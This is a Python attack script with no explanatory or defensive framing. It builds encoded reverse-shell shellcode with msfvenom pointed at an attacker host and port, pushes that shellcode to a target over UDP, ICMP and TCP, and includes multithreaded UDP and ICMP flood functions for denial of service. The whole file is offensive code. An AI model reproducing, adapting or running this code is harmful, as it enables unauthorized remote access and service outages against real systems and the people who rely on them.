import os
import socket
import time
import subprocess
import threading
from scapy.all import IP, UDP, ICMP, Raw, send, RandShort
from concurrent.futures import ThreadPoolExecutor

def xor_encrypt(data, key):
    return bytearray([b ^ key for b in data])

def generate_shellcode(payload, lhost, lport):
    command = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -e x86/shikata_ga_nai -i 3 -f raw"
    result = subprocess.run(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    if result.returncode != 0:
        raise RuntimeError(f"msfvenom failed: {result.stderr.decode()}")
    return result.stdout

def send_shellcode_via_udp(shellcode, target_ip, target_port, num_packets, burst_interval):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65507)
    for i in range(num_packets):
        try:
            sock.sendto(shellcode, (target_ip, target_port))
            print(f"[+] Packet {i+1}/{num_packets} sent to {target_ip}:{target_port}")
            if burst_interval > 0:
                time.sleep(burst_interval)
        except Exception as e:
            print(f"[-] Error: {e}")
            break
    sock.close()

def send_shellcode_via_icmp(shellcode, target_ip, num_packets, burst_interval):
    for i in range(num_packets):
        pkt = IP(dst=target_ip)/ICMP(id=RandShort(), seq=RandShort())/Raw(load=shellcode)
        try:
            send(pkt, verbose=False)
            print(f"[+] ICMP Packet {i+1}/{num_packets} sent to {target_ip}")
            if burst_interval > 0:
                time.sleep(burst_interval)
        except Exception as e:
            print(f"[-] Error: {e}")
            break

def send_shellcode_via_tcp(shellcode, target_ip, target_port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(10)
        try:
            s.connect((target_ip, target_port))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.sendall(shellcode)
            print(f"[+] Shellcode sent to {target_ip}:{target_port} via TCP")
        except Exception as e:
            print(f"[-] TCP connection failed: {e}")

def _send_packet(sock, packet, target):
    try:
        sock.sendto(packet, target)
        return True
    except:
        return False

def stress_attack(target_ip, target_port, duration, protocol='udp', packet_size=1024):
    end_time = time.time() + duration
    packet = os.urandom(packet_size)
    threads = []
    max_threads = os.cpu_count() * 2
    
    if protocol == 'udp':
        def udp_flood():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65507)
            while time.time() < end_time:
                try:
                    with ThreadPoolExecutor(max_workers=4) as executor:
                        futures = [
                            executor.submit(_send_packet, sock, packet, (target_ip, target_port))
                            for _ in range(100)
                        ]
                        success = sum(1 for f in futures if f.result())
                        print(f"[+] Sent {success} UDP packets to {target_ip}:{target_port}")
                except Exception as e:
                    print(f"[-] Error in UDP flood: {e}")
                    break
            sock.close()

        for _ in range(max_threads):
            t = threading.Thread(target=udp_flood)
            t.daemon = True
            threads.append(t)
            t.start()
            
    elif protocol == 'icmp':
        def icmp_flood():
            while time.time() < end_time:
                try:
                    pkt = IP(dst=target_ip)/ICMP(id=RandShort(), seq=RandShort())/Raw(load=packet)
                    send(pkt, verbose=False)
                    print(f"[+] ICMP packet sent to {target_ip}")
                except Exception as e:
                    print(f"[-] Error sending ICMP packet: {e}")
                    break

        for _ in range(max_threads):
            t = threading.Thread(target=icmp_flood)
            t.daemon = True
            threads.append(t)
            t.start()

    for t in threads:
        t.join()